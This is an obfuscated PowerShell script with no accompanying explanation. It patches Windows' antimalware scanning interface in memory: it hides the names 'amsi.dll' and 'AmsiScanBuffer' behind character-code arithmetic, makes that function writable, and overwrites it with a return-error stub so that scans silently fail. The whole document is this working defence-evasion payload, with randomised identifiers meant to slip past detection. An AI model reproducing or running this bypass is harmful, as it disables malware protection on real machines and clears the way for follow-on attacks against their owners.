$fo7UIUVimul = @"
using System;
using System.Runtime.InteropServices;
public class fo7UIUVimul {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr HHN0y, string S20hAM);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr EsQP, UIntPtr YVS, uint c37cFJA5bBGtLGvH7HMb, out uint oqH);
}
"@

Add-Type $fo7UIUVimul

$JK1goQ8GdQoph = [fo7UIUVimul]::LoadLibrary("$([ChAr]([ByTe]0x61)+[chAR](109*70/70)+[CHAr]([bytE]0x73)+[CHAR]([BytE]0x69)+[ChAR]([bYTE]0x2e)+[CHaR](100*6/6)+[chaR]([bYTe]0x6c)+[cHar](20+88))")
$knOjTcppiT = [fo7UIUVimul]::GetProcAddress($JK1goQ8GdQoph, "$(('ÁmsîSc'+'änBùff'+'êr').norMALizE([chAr](70+37-37)+[cHAr](111*32/32)+[char](114)+[char]([bYTE]0x6d)+[cHaR](68)) -replace [Char]([Byte]0x5c)+[ChAr](112*95/95)+[cHar]([byte]0x7b)+[cHAR](31+46)+[chAR](43+67)+[char]([bYTE]0x7d))")
$p = 0
[fo7UIUVimul]::VirtualProtect($knOjTcppiT, [uint32]5, 0x40, [ref]$p)
$ADIrQAqia1eEaMYw = "0xB8"
$bzyNby = "0x57"
$nJIf = "0x00"
$HcFxsZYziqCyL_yR = "0x07"
$SRa = "0x80"
$s6_lvKQ5xDidWH = "0xC3"
$xxyxD = [Byte[]] ($ADIrQAqia1eEaMYw,$bzyNby,$nJIf,$HcFxsZYziqCyL_yR,+$SRa,+$s6_lvKQ5xDidWH)
[System.Runtime.InteropServices.Marshal]::Copy($xxyxD, 0, $knOjTcppiT, 6)